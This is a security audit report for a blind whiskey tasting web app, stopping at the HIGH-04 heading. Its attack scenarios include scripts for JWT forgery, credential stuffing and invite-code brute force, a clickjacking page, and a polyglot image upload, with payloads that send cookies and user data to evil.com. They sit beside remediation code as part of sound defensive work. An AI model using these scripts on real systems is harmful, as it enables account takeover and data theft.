# Security Audit Report
## Whiskey Canon Blinds Application

**Audit Date:** January 26, 2026
**Auditor:** Security Consultant
**Scope:** Full-stack application security review
**Classification:** Confidential

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Compliance Mapping](#compliance-mapping)
3. [Critical Findings](#critical-findings)
4. [High Severity Findings](#high-severity-findings)
5. [Medium Severity Findings](#medium-severity-findings)
6. [Low Severity Findings](#low-severity-findings)
7. [Missing Security Features](#missing-security-features)
8. [Positive Security Practices](#positive-security-practices)
9. [Complete Remediation Code](#complete-remediation-code)
10. [Claude Code Implementation Guide](#claude-code-implementation-guide)

---

## Executive Summary

This security audit was conducted on the Whiskey Canon Blinds application, a full-stack blind whiskey tasting platform built with React 19 (frontend) and Express 5 + SQLite (backend).

### Risk Assessment Overview

| Severity | Count | Status |
|----------|-------|--------|
| Critical | 4 | Requires immediate attention |
| High | 5 | Should be addressed within 2 weeks |
| Medium | 6 | Should be addressed within 1 month |
| Low | 4 | Address as time permits |

### Overall Security Posture: **MODERATE RISK**

The application implements several good security practices (bcrypt password hashing, ORM-based queries, role-based access control) but has critical gaps in rate limiting, token management, and security headers that expose it to common attack vectors.

### Technology Stack

| Component | Technology | Version |
|-----------|------------|---------|
| Frontend | React + Vite | 19.2.0 / 7.2.4 |
| Backend | Express | 5.2.1 |
| Database | SQLite + Drizzle ORM | 0.45.1 |
| Styling | Tailwind CSS | 4.1.18 |
| Real-time | Socket.io | 4.8.3 |
| State | Zustand | 5.0.10 |

**Note:** This is NOT a Next.js application. It uses Vite + React with a separate Express backend.

### Remediation Timeline

| Phase | Duration | Priority | Tasks |
|-------|----------|----------|-------|
| **Phase 1** | Week 1 | Critical | JWT secret configuration, rate limiting, secure invite codes, security headers (helmet) |
| **Phase 2** | Week 2 | High | Password validation, file upload validation, email normalization, audit logging |
| **Phase 3** | Week 3 | High | AWS SES email integration, password reset functionality |
| **Phase 4** | Week 4 | Medium | CSRF protection, cookie-based auth migration, Zod input validation |
| **Phase 5** | Month 2 | Enhancement | Neon PostgreSQL migration, accessibility (ARIA), light/dark theming, image optimization |
| **Phase 6** | Month 3-4 | Architecture | Next.js App Router migration, Server Components, Ably/Pusher real-time replacement |

### Total Findings Summary

| Category | Critical | High | Medium | Low | Info |
|----------|----------|------|--------|-----|------|
| Security | 4 | 5 | 6 | 4 | - |
| Infrastructure | - | 2 | - | - | 1 |
| API Design | - | - | 2 | - | - |
| Privacy | - | - | 2 | - | - |
| Accessibility | - | - | 2 | - | - |
| Architecture | - | - | 1 | - | - |
| Performance | - | - | - | 1 | - |
| **Total** | **4** | **7** | **13** | **5** | **1** |

---

## Compliance Mapping

### OWASP Top 10 (2021) Coverage

| OWASP Category | Finding IDs | Status |
|----------------|-------------|--------|
| A01:2021 - Broken Access Control | MED-04 | Partial gap |
| A02:2021 - Cryptographic Failures | CRIT-01, CRIT-03 | **Critical gaps** |
| A03:2021 - Injection | N/A | Protected (ORM) |
| A04:2021 - Insecure Design | HIGH-05, MISS-04 | Gaps |
| A05:2021 - Security Misconfiguration | CRIT-04, LOW-02 | **Critical gaps** |
| A06:2021 - Vulnerable Components | N/A | Not assessed |
| A07:2021 - Auth Failures | CRIT-02, HIGH-01, HIGH-04 | **Critical gaps** |
| A08:2021 - Software/Data Integrity | HIGH-02 | Gap |
| A09:2021 - Logging Failures | HIGH-05, MED-03 | Gaps |
| A10:2021 - SSRF | N/A | Not applicable |

### CWE Mapping Summary

| CWE ID | CWE Name | Finding |
|--------|----------|---------|
| CWE-798 | Use of Hard-coded Credentials | CRIT-01 |
| CWE-307 | Improper Restriction of Excessive Auth Attempts | CRIT-02 |
| CWE-338 | Use of Cryptographically Weak PRNG | CRIT-03 |
| CWE-693 | Protection Mechanism Failure | CRIT-04 |
| CWE-521 | Weak Password Requirements | HIGH-01 |
| CWE-434 | Unrestricted Upload of Dangerous File | HIGH-02 |
| CWE-706 | Use of Incorrectly-Resolved Name | HIGH-03 |
| CWE-613 | Insufficient Session Expiration | HIGH-04 |
| CWE-778 | Insufficient Logging | HIGH-05 |
| CWE-922 | Insecure Storage of Sensitive Info | MED-01 |
| CWE-20 | Improper Input Validation | MED-02 |
| CWE-532 | Sensitive Info in Log Files | MED-03 |
| CWE-306 | Missing Auth for Critical Function | MED-04 |
| CWE-352 | Cross-Site Request Forgery | MED-05 |

### Compliance Framework Alignment

| Framework | Relevant Controls | Status |
|-----------|-------------------|--------|
| **SOC 2 Type II** | CC6.1 (Logical Access), CC6.6 (Security Events) | Gaps in audit logging |
| **GDPR** | Art. 32 (Security of Processing) | Rate limiting needed |
| **PCI DSS 4.0** | Req. 8.3 (Strong Auth), Req. 10.2 (Audit Trails) | Multiple gaps |
| **NIST 800-53** | AC-7 (Unsuccessful Logins), AU-2 (Audit Events) | Gaps |

---

## Critical Findings

### CRIT-01: Hardcoded JWT Secret Fallback

**Severity:** CRITICAL
**CVSS Score:** 9.8 (Critical)
**CWE:** CWE-798 (Use of Hard-coded Credentials)
**OWASP:** A02:2021 - Cryptographic Failures

**Location:**
- `server/src/middleware/auth.ts:5`
- `server/src/routes/sessions.ts:15`

#### Vulnerable Code

```typescript
// server/src/middleware/auth.ts:5
const JWT_SECRET = process.env.JWT_SECRET || 'whiskey-canon-secret-change-in-production';
```

#### Attack Scenario

**Prerequisites:** Application deployed without `JWT_SECRET` environment variable set.

**Exploitation Steps:**

1. Attacker discovers the hardcoded secret from public source code or documentation
2. Attacker crafts a valid JWT token for any user:

```javascript
// Attacker's exploit script
const jwt = require('jsonwebtoken');

// Known default secret from source code
const SECRET = 'whiskey-canon-secret-change-in-production';

// Forge admin token
const maliciousToken = jwt.sign(
  {
    userId: 'any-user-id',
    email: 'admin@target.com',
    role: 'admin'
  },
  SECRET,
  { expiresIn: '24h' }
);

console.log('Forged admin token:', maliciousToken);

// Use with: curl -H "Authorization: Bearer {token}" https://target.com/api/admin/users
```

3. Attacker gains full administrative access to the application
4. Attacker can delete users, change roles, access all session data

**Impact:**
- Complete authentication bypass
- Full account takeover for any user
- Administrative privilege escalation
- Data exfiltration

#### Remediation Code

```typescript
// server/src/config/index.ts (NEW FILE)
import dotenv from 'dotenv';

dotenv.config();

function requireEnv(key: string): string {
  const value = process.env[key];
  if (!value) {
    console.error(`FATAL: Required environment variable ${key} is not set`);
    process.exit(1);
  }
  return value;
}

function requireEnvInProduction(key: string, devDefault: string): string {
  const value = process.env[key];
  if (!value) {
    if (process.env.NODE_ENV === 'production') {
      console.error(`FATAL: Required environment variable ${key} is not set in production`);
      process.exit(1);
    }
    console.warn(`WARNING: Using default ${key} - DO NOT USE IN PRODUCTION`);
    return devDefault;
  }
  return value;
}

export const config = {
  // Always required - no fallback
  jwtSecret: requireEnv('JWT_SECRET'),

  // Required in production, has dev defaults
  nodeEnv: process.env.NODE_ENV || 'development',
  port: parseInt(process.env.PORT || '3001', 10),
  clientUrl: requireEnvInProduction('CLIENT_URL', 'http://localhost:5173'),
  databasePath: process.env.DATABASE_PATH || './data/whiskey.db',

  // AWS SES Configuration
  aws: {
    region: process.env.AWS_REGION || 'us-east-1',
    accessKeyId: process.env.AWS_ACCESS_KEY_ID,
    secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,
    sesFromEmail: process.env.SES_FROM_EMAIL || 'noreply@localhost',
  },
};

// Validate critical config on import
if (config.jwtSecret.length < 32) {
  console.error('FATAL: JWT_SECRET must be at least 32 characters');
  process.exit(1);
}
```

```typescript
// server/src/middleware/auth.ts (UPDATED)
import jwt from 'jsonwebtoken';
import { config } from '../config';

// Remove old hardcoded secret line
// const JWT_SECRET = process.env.JWT_SECRET || 'whiskey-canon-secret-change-in-production';

export function generateAccessToken(payload: JwtPayload): string {
  return jwt.sign(payload, config.jwtSecret, { expiresIn: '15m' });
}

export function generateRefreshToken(payload: JwtPayload): string {
  return jwt.sign(payload, config.jwtSecret, { expiresIn: '24h' });
}

export function verifyToken<T>(token: string): T {
  return jwt.verify(token, config.jwtSecret) as T;
}
```

---

### CRIT-02: No Rate Limiting

**Severity:** CRITICAL
**CVSS Score:** 8.6 (High)
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)
**OWASP:** A07:2021 - Identification and Authentication Failures

**Location:**
- `server/src/routes/auth.ts` (login: line 138, register: line 54)
- `server/src/routes/sessions.ts` (join: line 224)
- `server/src/index.ts` (global middleware)

#### Vulnerable Code

```typescript
// server/src/routes/auth.ts:138 - No rate limiting
router.post('/login', async (req: Request, res: Response) => {
  const { email, password } = req.body;
  // ... direct processing without any throttling
});
```

#### Attack Scenario

**Attack 1: Credential Stuffing**

```python
# attacker_credential_stuffing.py
import requests
import threading
from queue import Queue

TARGET = "https://target.com/api/auth/login"
LEAKED_CREDENTIALS = "leaked_passwords.txt"  # From data breaches

def try_login(email, password):
    try:
        r = requests.post(TARGET, json={"email": email, "password": password}, timeout=5)
        if r.status_code == 200:
            print(f"[SUCCESS] {email}:{password}")
            with open("valid_creds.txt", "a") as f:
                f.write(f"{email}:{password}\n")
    except:
        pass

# Load leaked credentials
credentials = Queue()
with open(LEAKED_CREDENTIALS) as f:
    for line in f:
        email, password = line.strip().split(":")
        credentials.put((email, password))

# Multi-threaded attack - 100 concurrent requests
threads = []
for _ in range(100):
    while not credentials.empty():
        email, password = credentials.get()
        t = threading.Thread(target=try_login, args=(email, password))
        t.start()
        threads.append(t)

# No rate limiting = thousands of attempts per minute
```

**Attack 2: Invite Code Brute Force**

```python
# attacker_invite_brute.py
import requests
import itertools
import string

TARGET = "https://target.com/api/sessions/join"
CHARSET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"

def try_code(code):
    r = requests.post(TARGET, json={"inviteCode": code, "displayName": "Attacker"})
    if r.status_code == 200:
        print(f"[VALID CODE] {code}")
        return True
    return False

# 6 character codes from 33 char set = 33^6 = 1.29 billion combinations
# But without rate limiting, can try ~1000/second = find valid code in ~15 days average
# With common patterns or timing attacks, much faster

# Try common patterns first
for code in itertools.product(CHARSET, repeat=6):
    if try_code(''.join(code)):
        break
```

**Impact:**
- Account compromise through credential stuffing
- Unauthorized access to private tasting sessions
- Service degradation/denial of service
- Resource exhaustion

#### Remediation Code

```typescript
// server/src/middleware/rateLimit.ts (NEW FILE)
import rateLimit from 'express-rate-limit';
import { Request } from 'express';

// Store for tracking failed login attempts per account
const loginAttempts = new Map<string, { count: number; lockedUntil?: Date }>();

// Strict rate limit for login - tracks by IP + email
export const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: {
    error: 'Too many login attempts. Please try again in 15 minutes.',
    retryAfter: 900 // seconds
  },
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req: Request) => {
    const email = req.body?.email?.toLowerCase() || 'unknown';
    return `login:${req.ip}:${email}`;
  },
  handler: (req, res) => {
    res.status(429).json({
      error: 'Too many login attempts. Please try again in 15 minutes.',
      retryAfter: 900
    });
  },
});

// Rate limit for registration - prevent mass account creation
export const registerLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 3, // 3 registrations per hour per IP
  message: {
    error: 'Too many registration attempts. Please try again later.',
    retryAfter: 3600
  },
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req: Request) => `register:${req.ip}`,
});

// Rate limit for session join - prevent invite code brute force
export const joinLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 10, // 10 attempts per minute
  message: {
    error: 'Too many join attempts. Please slow down.',
    retryAfter: 60
  },
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req: Request) => `join:${req.ip}`,
});

// Rate limit for password reset requests
export const passwordResetLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 3, // 3 reset requests per hour per email
  message: {
    error: 'Too many password reset requests. Please try again later.',
    retryAfter: 3600
  },
  keyGenerator: (req: Request) => {
    const email = req.body?.email?.toLowerCase() || 'unknown';
    return `reset:${email}`;
  },
});

// General API rate limit
export const apiLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minute
  max: 100, // 100 requests per minute
  message: { error: 'Too many requests. Please slow down.' },
  standardHeaders: true,
  legacyHeaders: false,
});

// Account lockout helper
export function checkAccountLockout(email: string): { locked: boolean; remainingMs?: number } {
  const key = email.toLowerCase();
  const attempt = loginAttempts.get(key);

  if (attempt?.lockedUntil) {
    const now = new Date();
    if (attempt.lockedUntil > now) {
      return {
        locked: true,
        remainingMs: attempt.lockedUntil.getTime() - now.getTime()
      };
    }
    // Lock expired, reset
    loginAttempts.delete(key);
  }

  return { locked: false };
}

export function recordFailedLogin(email: string): void {
  const key = email.toLowerCase();
  const attempt = loginAttempts.get(key) || { count: 0 };
  attempt.count++;

  // Lock account after 5 failed attempts
  if (attempt.count >= 5) {
    attempt.lockedUntil = new Date(Date.now() + 15 * 60 * 1000); // 15 min lockout
  }

  loginAttempts.set(key, attempt);
}

export function clearFailedLogins(email: string): void {
  loginAttempts.delete(email.toLowerCase());
}
```

```typescript
// Apply to routes - server/src/routes/auth.ts
import { loginLimiter, registerLimiter, checkAccountLockout, recordFailedLogin, clearFailedLogins } from '../middleware/rateLimit';

router.post('/register', registerLimiter, async (req: Request, res: Response) => {
  // ... existing code
});

router.post('/login', loginLimiter, async (req: Request, res: Response) => {
  const { email, password } = req.body;

  // Check account lockout
  const lockout = checkAccountLockout(email);
  if (lockout.locked) {
    return res.status(423).json({
      error: 'Account temporarily locked due to too many failed attempts',
      retryAfter: Math.ceil(lockout.remainingMs! / 1000)
    });
  }

  // ... existing validation and lookup

  const isValidPassword = await bcrypt.compare(password, user.passwordHash);
  if (!isValidPassword) {
    recordFailedLogin(email);
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Clear failed attempts on successful login
  clearFailedLogins(email);

  // ... rest of login logic
});
```

```typescript
// Apply to server/src/routes/sessions.ts
import { joinLimiter } from '../middleware/rateLimit';

router.post('/join', joinLimiter, async (req: AuthRequest, res: Response) => {
  // ... existing code
});
```

```typescript
// Apply globally - server/src/index.ts
import { apiLimiter } from './middleware/rateLimit';

// Apply after CORS, before routes
app.use(apiLimiter);
```

---

### CRIT-03: Weak Cryptographic Random for Invite Codes

**Severity:** CRITICAL
**CVSS Score:** 7.5 (High)
**CWE:** CWE-338 (Use of Cryptographically Weak PRNG)
**OWASP:** A02:2021 - Cryptographic Failures

**Location:**
- `server/src/routes/sessions.ts:20-27`

#### Vulnerable Code

```typescript
// server/src/routes/sessions.ts:20-27
function generateInviteCode(): string {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  let code = '';
  for (let i = 0; i < 6; i++) {
    code += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return code;
}
```

#### Attack Scenario

**Math.random() State Recovery Attack:**

```javascript
// attacker_predict_random.js
// Math.random() in V8 uses xorshift128+ which can be reversed

// If attacker can observe several outputs, they can predict future ones
// Reference: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f

class XorShift128Plus {
  constructor(state0, state1) {
    this.state0 = state0;
    this.state1 = state1;
  }

  next() {
    let s1 = this.state0;
    let s0 = this.state1;
    this.state0 = s0;
    s1 ^= s1 << 23n;
    s1 ^= s1 >> 17n;
    s1 ^= s0;
    s1 ^= s0 >> 26n;
    this.state1 = s1;
    return (this.state0 + this.state1) & ((1n << 64n) - 1n);
  }
}

// With ~600 observations of Math.random() outputs,
// attacker can recover internal state and predict future codes
```

**Entropy Analysis:**
- 6 characters from 33-character set = 33^6 = 1,291,467,969 possibilities
- This is only ~30 bits of entropy
- With no rate limiting, brute force in ~15 days at 1000 req/sec
- With state recovery, prediction becomes trivial

#### Remediation Code

```typescript
// server/src/routes/sessions.ts - UPDATED generateInviteCode
import crypto from 'crypto';

function generateInviteCode(): string {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  const codeLength = 8; // Increased from 6 to 8
  const randomBytes = crypto.randomBytes(codeLength);

  let code = '';
  for (let i = 0; i < codeLength; i++) {
    // Use modulo with rejection sampling for uniform distribution
    const maxValid = 256 - (256 % chars.length);
    let randomByte = randomBytes[i];

    // Rejection sampling to avoid modulo bias
    while (randomByte >= maxValid) {
      randomByte = crypto.randomBytes(1)[0];
    }

    code += chars.charAt(randomByte % chars.length);
  }

  return code;
}

// Also add uniqueness check
async function generateUniqueInviteCode(): Promise<string> {
  const maxAttempts = 10;

  for (let i = 0; i < maxAttempts; i++) {
    const code = generateInviteCode();

    // Check if code already exists
    const existing = await db.query.sessions.findFirst({
      where: and(
        eq(schema.sessions.inviteCode, code),
        ne(schema.sessions.status, 'completed')
      ),
    });

    if (!existing) {
      return code;
    }
  }

  throw new Error('Failed to generate unique invite code');
}
```

---

### CRIT-04: Missing Security Headers

**Severity:** CRITICAL
**CVSS Score:** 7.1 (High)
**CWE:** CWE-693 (Protection Mechanism Failure)
**OWASP:** A05:2021 - Security Misconfiguration

**Location:**
- `server/src/index.ts`

#### Current State

```bash
# Current response headers (missing security headers)
$ curl -I https://target.com/api/auth/me

HTTP/1.1 200 OK
Content-Type: application/json
# No security headers present!
```

#### Attack Scenario

**Clickjacking Attack (No X-Frame-Options):**

```html
<!-- attacker_clickjack.html -->
<!DOCTYPE html>
<html>
<head>
  <title>Win a Free Whiskey!</title>
  <style>
    .hidden-frame {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      opacity: 0.01;
      z-index: 2;
    }
    .bait-button {
      position: absolute;
      top: 200px;
      left: 300px;
      padding: 20px 40px;
      font-size: 24px;
      z-index: 1;
    }
  </style>
</head>
<body>
  <h1>Congratulations! You've won a free whiskey tasting!</h1>
  <button class="bait-button">CLAIM YOUR PRIZE</button>

  <!-- Hidden iframe positioned so "Delete Account" button aligns with bait -->
  <iframe class="hidden-frame" src="https://target.com/profile"></iframe>

  <!-- User clicks "CLAIM YOUR PRIZE" but actually clicks "Delete Account" -->
</body>
</html>
```

**MIME Sniffing Attack (No X-Content-Type-Options):**

```javascript
// If user uploads a file that browser sniffs as HTML
// attacker.jpg (actually contains HTML/JS)
<script>
  // Steal cookies, perform actions as user
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
```

#### Remediation Code

```typescript
// server/src/index.ts
import helmet from 'helmet';
import { config } from './config';

// Security headers with helmet
app.use(helmet({
  // Content Security Policy
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"], // Tailwind needs inline styles
      imgSrc: ["'self'", "data:", "blob:"],
      connectSrc: ["'self'", "ws:", "wss:"], // WebSocket connections
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
      upgradeInsecureRequests: config.nodeEnv === 'production' ? [] : null,
    },
  },

  // Prevent clickjacking
  frameguard: { action: 'deny' },

  // Prevent MIME sniffing
  noSniff: true,

  // XSS protection (legacy browsers)
  xssFilter: true,

  // HSTS (enable in production with HTTPS)
  hsts: config.nodeEnv === 'production' ? {
    maxAge: 31536000, // 1 year
    includeSubDomains: true,
    preload: true,
  } : false,

  // Referrer policy
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },

  // Don't advertise Express
  hidePoweredBy: true,

  // DNS prefetch control
  dnsPrefetchControl: { allow: false },

  // IE no open
  ieNoOpen: true,

  // Cross-origin policies
  crossOriginEmbedderPolicy: false, // May need adjustment for file uploads
  crossOriginResourcePolicy: { policy: 'same-origin' },
  crossOriginOpenerPolicy: { policy: 'same-origin' },
}));

// Additional security headers not covered by helmet
app.use((req, res, next) => {
  // Permissions Policy (formerly Feature-Policy)
  res.setHeader('Permissions-Policy',
    'camera=(), microphone=(), geolocation=(), payment=()'
  );
  next();
});
```

---

## High Severity Findings

### HIGH-01: Weak Password Requirements

**Severity:** HIGH
**CVSS Score:** 6.5
**CWE:** CWE-521 (Weak Password Requirements)
**OWASP:** A07:2021 - Identification and Authentication Failures

**Location:**
- `server/src/routes/auth.ts:399-401` (password change)
- `server/src/routes/auth.ts:76-78` (registration)

#### Vulnerable Code

```typescript
// server/src/routes/auth.ts:76-78
if (!password || password.length < 6) {
  return res.status(400).json({ error: 'Password must be at least 6 characters' });
}

// server/src/routes/auth.ts:399-401
if (newPassword.length < 6) {
  return res.status(400).json({ error: 'New password must be at least 6 characters' });
}
```

#### Attack Scenario

**Password Cracking:**

```python
# attacker_crack_password.py
import hashlib
import itertools
import string

# 6 character passwords with no complexity
# lowercase only: 26^6 = 308,915,776 combinations
# With GPU: crack in seconds

# Common 6-char passwords that would be accepted:
weak_passwords = [
    "123456", "password", "qwerty", "abc123",
    "monkey", "dragon", "master", "letmein",
    "whiskey", "bourbon", "scotch", "taster"
]

# If bcrypt hash is obtained (through SQL injection, backup leak, etc.)
# Even with bcrypt, weak passwords are crackable

# Hashcat command for bcrypt:
# hashcat -m 3200 -a 3 hash.txt ?a?a?a?a?a?a
```

#### Remediation Code

```typescript
// server/src/utils/validation.ts - ADD password validation

// Common passwords to block (should be loaded from file in production)
const COMMON_PASSWORDS = new Set([
  'password', '123456', '12345678', 'qwerty', 'abc123', 'monkey', 'master',
  'dragon', 'letmein', 'login', 'princess', 'admin', 'welcome', 'whiskey',
  'bourbon', 'scotch', 'tasting', 'blind', 'session'
]);

export interface PasswordValidationResult {
  valid: boolean;
  errors: string[];
  strength: 'weak' | 'fair' | 'strong' | 'very-strong';
}

export function validatePassword(password: string, email?: string): PasswordValidationResult {
  const errors: string[] = [];
  let strengthScore = 0;

  // Length check (NIST recommends 8+ minimum, we use 12)
  if (password.length < 12) {
    errors.push('Password must be at least 12 characters');
  } else if (password.length >= 16) {
    strengthScore += 2;
  } else {
    strengthScore += 1;
  }

  // Character class checks
  if (!/[A-Z]/.test(password)) {
    errors.push('Password must contain at least one uppercase letter');
  } else {
    strengthScore += 1;
  }

  if (!/[a-z]/.test(password)) {
    errors.push('Password must contain at least one lowercase letter');
  } else {
    strengthScore += 1;
  }

  if (!/[0-9]/.test(password)) {
    errors.push('Password must contain at least one number');
  } else {
    strengthScore += 1;
  }

  if (!/[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?`~]/.test(password)) {
    errors.push('Password must contain at least one special character (!@#$%^&*...)');
  } else {
    strengthScore += 1;
  }

  // Common password check
  const lowerPassword = password.toLowerCase();
  if (COMMON_PASSWORDS.has(lowerPassword)) {
    errors.push('Password is too common. Please choose a unique password.');
  }

  // Check for common patterns
  if (/(.)\1{2,}/.test(password)) {
    errors.push('Password cannot contain 3 or more repeated characters');
  }

  if (/^[a-zA-Z]+$/.test(password) || /^[0-9]+$/.test(password)) {
    errors.push('Password cannot be only letters or only numbers');
  }

  // Sequential characters check
  if (/(?:abc|bcd|cde|def|efg|fgh|ghi|hij|ijk|jkl|klm|lmn|mno|nop|opq|pqr|qrs|rst|stu|tuv|uvw|vwx|wxy|xyz|012|123|234|345|456|567|678|789)/i.test(password)) {
    errors.push('Password cannot contain sequential characters (abc, 123, etc.)');
  }

  // Email similarity check
  if (email) {
    const emailLocal = email.split('@')[0].toLowerCase();
    if (lowerPassword.includes(emailLocal) || emailLocal.includes(lowerPassword.slice(0, 5))) {
      errors.push('Password cannot be similar to your email address');
    }
  }

  // Determine strength
  let strength: PasswordValidationResult['strength'] = 'weak';
  if (errors.length === 0) {
    if (strengthScore >= 6) strength = 'very-strong';
    else if (strengthScore >= 5) strength = 'strong';
    else if (strengthScore >= 4) strength = 'fair';
  }

  return {
    valid: errors.length === 0,
    errors,
    strength,
  };
}
```

```typescript
// server/src/routes/auth.ts - Apply validation

import { validatePassword } from '../utils/validation';

// In registration handler (line ~76)
const passwordValidation = validatePassword(password, email);
if (!passwordValidation.valid) {
  return res.status(400).json({
    error: 'Password does not meet requirements',
    details: passwordValidation.errors
  });
}

// In password change handler (line ~399)
const passwordValidation = validatePassword(newPassword, req.userEmail);
if (!passwordValidation.valid) {
  return res.status(400).json({
    error: 'New password does not meet requirements',
    details: passwordValidation.errors
  });
}
```

---

### HIGH-02: No File Content Validation

**Severity:** HIGH
**CVSS Score:** 6.3
**CWE:** CWE-434 (Unrestricted Upload of File with Dangerous Type)
**OWASP:** A08:2021 - Software and Data Integrity Failures

**Location:**
- `server/src/routes/auth.ts:38-51`

#### Vulnerable Code

```typescript
// server/src/routes/auth.ts:38-51
const avatarUpload = multer({
  storage: avatarStorage,
  limits: { fileSize: 5 * 1024 * 1024 },
  fileFilter: (req, file, cb) => {
    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
    if (allowedTypes.includes(file.mimetype)) {
      cb(null, true);  // Only checks MIME header, not actual content!
    } else {
      cb(new Error('Invalid file type'));
    }
  },
});
```

#### Attack Scenario

**Polyglot File Upload:**

```python
# attacker_polyglot.py
# Create a file that is both valid JPEG and contains malicious content

# JPEG magic bytes
jpeg_header = bytes([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00])

# Malicious payload embedded in JPEG comment
malicious_js = b"""
<script>
  // If rendered as HTML, this executes
  fetch('/api/admin/users').then(r => r.json()).then(d => {
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: JSON.stringify(d)
    });
  });
</script>
"""

# Create polyglot
polyglot = jpeg_header + b'\xFF\xFE' + len(malicious_js).to_bytes(2, 'big') + malicious_js

with open('malicious.jpg', 'wb') as f:
    f.write(polyglot)

# Upload with spoofed MIME type
import requests
files = {'avatar': ('avatar.jpg', open('malicious.jpg', 'rb'), 'image/jpeg')}
requests.post('https://target.com/api/auth/me/avatar', files=files)
```

#### Remediation Code

```typescript
// server/src/routes/auth.ts - Enhanced file validation
import { fileTypeFromBuffer } from 'file-type';
import fs from 'fs/promises';
import path from 'path';
import sharp from 'sharp'; // For image processing/sanitization

const ALLOWED_MIME_TYPES = new Set([
  'image/jpeg',
  'image/png',
  'image/gif',
  'image/webp'
]);

const ALLOWED_EXTENSIONS = new Set(['.jpg', '.jpeg', '.png', '.gif', '.webp']);

async function validateAndSanitizeImage(filePath: string): Promise<{
  valid: boolean;
  error?: string;
  sanitizedPath?: string;
}> {
  try {
    // Read file and check magic bytes
    const buffer = await fs.readFile(filePath);
    const fileType = await fileTypeFromBuffer(buffer);

    if (!fileType) {
      return { valid: false, error: 'Unable to determine file type' };
    }

    if (!ALLOWED_MIME_TYPES.has(fileType.mime)) {
      return { valid: false, error: `Invalid file type: ${fileType.mime}` };
    }

    // Additional validation: try to process the image
    // This will fail if the file is not a valid image
    const metadata = await sharp(buffer).metadata();

    if (!metadata.width || !metadata.height) {
      return { valid: false, error: 'Invalid image dimensions' };
    }

    // Limit dimensions
    if (metadata.width > 4096 || metadata.height > 4096) {
      return { valid: false, error: 'Image dimensions too large (max 4096x4096)' };
    }

    // Sanitize by re-encoding the image (strips any embedded content)
    const sanitizedPath = filePath.replace(/\.[^.]+$/, '_sanitized.jpg');

    await sharp(buffer)
      .resize(512, 512, { fit: 'cover', withoutEnlargement: true })
      .jpeg({ quality: 85 })
      .toFile(sanitizedPath);

    // Delete original
    await fs.unlink(filePath);

    return { valid: true, sanitizedPath };
  } catch (error) {
    return { valid: false, error: 'Failed to process image' };
  }
}

// Updated avatar upload handler
router.post('/me/avatar', authenticateUser, avatarUpload.single('avatar'), async (req: AuthRequest, res: Response) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'No file uploaded' });
    }

    // Validate extension
    const ext = path.extname(req.file.originalname).toLowerCase();
    if (!ALLOWED_EXTENSIONS.has(ext)) {
      await fs.unlink(req.file.path);
      return res.status(400).json({ error: 'Invalid file extension' });
    }

    // Validate and sanitize file content
    const validation = await validateAndSanitizeImage(req.file.path);

    if (!validation.valid) {
      // Clean up if file still exists
      try { await fs.unlink(req.file.path); } catch {}
      return res.status(400).json({ error: validation.error });
    }

    // Use sanitized path for storage
    const avatarUrl = `/uploads/avatars/${path.basename(validation.sanitizedPath!)}`;

    // ... rest of handler (delete old avatar, update DB)
  } catch (error) {
    console.error('Avatar upload error:', error);
    return res.status(500).json({ error: 'Failed to upload avatar' });
  }
});
```

---

### HIGH-03: Email Normalization Inconsistency

**Severity:** HIGH
**CVSS Score:** 5.9
**CWE:** CWE-706 (Use of Incorrectly-Resolved Name)
**OWASP:** A07:2021 - Identification and Authentication Failures

**Location:**
- `server/src/routes/auth.ts:68` - Uses `normalizeEmail()`
- `server/src/routes/auth.ts:148` - Uses `.toLowerCase()`

#### Vulnerable Code

```typescript
// server/src/routes/auth.ts:68 (registration)
const normalizedEmail = normalizeEmail(email);

// server/src/routes/auth.ts:148 (login)
const user = await db.query.users.findFirst({
  where: eq(schema.users.email, email.toLowerCase()),  // Different method!
});
```

#### Attack Scenario

```typescript
// Scenario: normalizeEmail() handles edge cases that toLowerCase() doesn't

// Example 1: Gmail dots
// "test.user@gmail.com" vs "testuser@gmail.com" - both deliver to same inbox
// normalizeEmail might normalize these, toLowerCase won't

// Example 2: Gmail plus addressing
// "user+tag@gmail.com" vs "user@gmail.com"

// Result: User registers with one format, can't login with another
// Or: Attacker creates duplicate accounts with variations
```

#### Remediation Code

```typescript
// server/src/routes/auth.ts - Consistent normalization

import { normalizeEmail } from '../utils/validation';

// In login handler (line ~148)
router.post('/login', loginLimiter, async (req: Request, res: Response) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required' });
  }

  // Use normalizeEmail consistently (not just toLowerCase)
  const normalizedEmail = normalizeEmail(email);

  const user = await db.query.users.findFirst({
    where: eq(schema.users.email, normalizedEmail),
  });

  // ... rest of login logic
});
```

---

### HIGH-04: Excessive Token Lifetimes

**Severity:** HIGH
